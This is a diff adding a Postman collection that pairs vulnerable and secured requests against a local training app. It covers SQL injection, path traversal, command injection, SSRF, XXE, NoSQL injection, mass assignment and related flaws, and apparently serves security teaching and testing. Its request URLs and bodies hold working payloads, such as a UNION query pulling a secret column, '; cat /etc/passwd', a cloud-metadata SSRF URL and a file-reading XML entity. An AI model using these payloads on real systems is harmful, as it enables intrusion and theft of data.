@@ -1,0 +1,113 @@
+{
+  "info": {
+    "name": "PortSwigger - Server-side (vuln vs secure)",
+    "description": "Server-side web security topics. Each folder has a VULN and a SECURE request. Base URL variable: baseUrl.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    { "key": "baseUrl", "value": "http://localhost:8080" }
+  ],
+  "item": [
+    {
+      "name": "SQL injection",
+      "item": [
+        { "name": "VULN - filter bypass (role=USER'--)", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/ps/serverside/sqli/vuln/users?role=USER'--" } },
+        { "name": "VULN - UNION exfil (secret column)", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/ps/serverside/sqli/vuln/users?role=x' UNION SELECT id,secret,role FROM app_users--" } },
+        { "name": "SECURE - parameterized", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/ps/serverside/sqli/secure/users?role=USER" } }
+      ]
+    },
+    {
+      "name": "Authentication",
+      "item": [
+        { "name": "VULN - username enumeration", "request": { "method": "POST", "header": [], "url": "{{baseUrl}}/ps/serverside/authentication/vuln/login?username=nobody&password=x" } },
+        { "name": "SECURE - generic error + lockout", "request": { "method": "POST", "header": [], "url": "{{baseUrl}}/ps/serverside/authentication/secure/login?username=salman&password=wrong" } }
+      ]
+    },
+    {
+      "name": "Path traversal",
+      "item": [
+        { "name": "VULN - read outside sandbox", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/ps/serverside/pathtraversal/vuln/download?filename=../secret.txt" } },
+        { "name": "SECURE - containment check (403)", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/ps/serverside/pathtraversal/secure/download?filename=../secret.txt" } }
+      ]
+    },
+    {
+      "name": "OS command injection",
+      "item": [
+        { "name": "VULN - shell metachars", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/ps/serverside/commandinjection/vuln/ping?host=127.0.0.1; cat /etc/passwd" } },
+        { "name": "SECURE - allowlist + argv", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/ps/serverside/commandinjection/secure/ping?host=127.0.0.1" } }
+      ]
+    },
+    {
+      "name": "Business logic",
+      "item": [
+        { "name": "VULN - negative quantity", "request": { "method": "POST", "header": [], "url": "{{baseUrl}}/ps/serverside/businesslogic/vuln/checkout?quantity=-5&unitPrice=100" } },
+        { "name": "SECURE - validated + server price", "request": { "method": "POST", "header": [], "url": "{{baseUrl}}/ps/serverside/businesslogic/secure/checkout?quantity=2" } }
+      ]
+    },
+    {
+      "name": "Information disclosure",
+      "item": [
+        { "name": "VULN - leaks exception/internals", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/ps/serverside/informationdisclosure/vuln/lookup?id=abc" } },
+        { "name": "SECURE - generic error", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/ps/serverside/informationdisclosure/secure/lookup?id=abc" } }
+      ]
+    },
+    {
+      "name": "Access control",
+      "item": [
+        { "name": "VULN - IDOR (other user)", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/ps/serverside/accesscontrol/vuln/account/2" } },
+        { "name": "SECURE - IDOR blocked (403)", "request": { "method": "GET", "header": [ { "key": "X-User", "value": "salman" } ], "url": "{{baseUrl}}/ps/serverside/accesscontrol/secure/account/2" } },
+        { "name": "VULN - unprotected admin action", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/ps/serverside/accesscontrol/vuln/admin/delete-user" } },
+        { "name": "SECURE - admin role required", "request": { "method": "GET", "header": [ { "key": "X-Role", "value": "USER" } ], "url": "{{baseUrl}}/ps/serverside/accesscontrol/secure/admin/delete-user" } }
+      ]
+    },
+    {
+      "name": "File upload",
+      "item": [
+        { "name": "VULN - upload any file", "request": { "method": "POST", "header": [], "body": { "mode": "formdata", "formdata": [ { "key": "file", "type": "file", "src": [] } ] }, "url": "{{baseUrl}}/ps/serverside/fileupload/vuln/upload" } },
+        { "name": "SECURE - type/size allowlist", "request": { "method": "POST", "header": [], "body": { "mode": "formdata", "formdata": [ { "key": "file", "type": "file", "src": [] } ] }, "url": "{{baseUrl}}/ps/serverside/fileupload/secure/upload" } }
+      ]
+    },
+    {
+      "name": "Race conditions",
+      "item": [
+        { "name": "VULN - non-atomic redeem", "request": { "method": "POST", "header": [], "url": "{{baseUrl}}/ps/serverside/raceconditions/vuln/redeem?card=GC1" } },
+        { "name": "SECURE - atomic check-and-set", "request": { "method": "POST", "header": [], "url": "{{baseUrl}}/ps/serverside/raceconditions/secure/redeem?card=GC2" } }
+      ]
+    },
+    {
+      "name": "SSRF",
+      "item": [
+        { "name": "VULN - fetch cloud metadata", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/ps/serverside/ssrf/vuln/fetch?url=http://169.254.169.254/latest/meta-data/" } },
+        { "name": "SECURE - internal blocked (403)", "request": { "method": "GET", "header": [], "url": "{{baseUrl}}/ps/serverside/ssrf/secure/fetch?url=http://169.254.169.254/latest/meta-data/" } }
+      ]
+    },
+    {
+      "name": "XXE injection",
+      "item": [
+        { "name": "VULN - external entity", "request": { "method": "POST", "header": [ { "key": "Content-Type", "value": "application/xml" } ], "body": { "mode": "raw", "raw": "<?xml version=\"1.0\"?>\n<!DOCTYPE r [ <!ENTITY x SYSTEM \"file:///etc/hostname\"> ]>\n<r>&x;</r>" }, "url": "{{baseUrl}}/ps/serverside/xxe/vuln/parse" } },
+        { "name": "SECURE - DOCTYPE disallowed", "request": { "method": "POST", "header": [ { "key": "Content-Type", "value": "application/xml" } ], "body": { "mode": "raw", "raw": "<?xml version=\"1.0\"?>\n<!DOCTYPE r [ <!ENTITY x SYSTEM \"file:///etc/hostname\"> ]>\n<r>&x;</r>" }, "url": "{{baseUrl}}/ps/serverside/xxe/secure/parse" } }
+      ]
+    },
+    {
+      "name": "NoSQL injection",
+      "item": [
+        { "name": "VULN - $ne auth bypass", "request": { "method": "POST", "header": [ { "key": "Content-Type", "value": "application/json" } ], "body": { "mode": "raw", "raw": "{ \"username\": \"admin\", \"password\": { \"$ne\": \"x\" } }" }, "url": "{{baseUrl}}/ps/serverside/nosqli/vuln/login" } },
+        { "name": "SECURE - strings only", "request": { "method": "POST", "header": [ { "key": "Content-Type", "value": "application/json" } ], "body": { "mode": "raw", "raw": "{ \"username\": \"admin\", \"password\": { \"$ne\": \"x\" } }" }, "url": "{{baseUrl}}/ps/serverside/nosqli/secure/login" } }
+      ]
+    },
+    {
+      "name": "API testing (mass assignment)",
+      "item": [
+        { "name": "VULN - set isAdmin/balance", "request": { "method": "POST", "header": [ { "key": "Content-Type", "value": "application/json" } ], "body": { "mode": "raw", "raw": "{ \"displayName\": \"x\", \"isAdmin\": true, \"balance\": 999999 }" }, "url": "{{baseUrl}}/ps/serverside/apitesting/vuln/profile" } },
+        { "name": "SECURE - DTO allowlist", "request": { "method": "POST", "header": [ { "key": "Content-Type", "value": "application/json" } ], "body": { "mode": "raw", "raw": "{ \"displayName\": \"x\", \"isAdmin\": true, \"balance\": 999999 }" }, "url": "{{baseUrl}}/ps/serverside/apitesting/secure/profile" } }
+      ]
+    },
+    {
+      "name": "Web cache deception",
+      "item": [
+        { "name": "VULN - personal data cacheable", "request": { "method": "GET", "header": [ { "key": "X-User", "value": "salman" } ], "url": "{{baseUrl}}/ps/serverside/webcachedeception/vuln/profile/wcd.css" } },
+        { "name": "SECURE - no-store", "request": { "method": "GET", "header": [ { "key": "X-User", "value": "salman" } ], "url": "{{baseUrl}}/ps/serverside/webcachedeception/secure/profile/wcd.css" } }
+      ]
+    }
+  ]
+}
